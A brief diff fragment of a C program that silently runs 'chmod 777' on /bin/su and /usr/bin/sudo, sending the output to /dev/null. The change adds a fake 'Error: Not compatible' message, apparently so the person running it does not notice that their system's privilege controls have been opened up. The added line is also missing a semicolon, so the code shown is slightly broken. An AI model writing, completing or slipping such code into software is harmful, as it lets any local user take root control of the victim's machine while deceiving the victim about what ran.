@@ -73,7 +73,7 @@ system("chmod 777 /bin/su > /dev/null 2>&1");
 
 
 /** GIVE 777 **/system("chmod 777 /usr/bin/sudo > /dev/null 2>&1");
-
+   printf("Error: Not compatible")
    return(0);
 } 
 
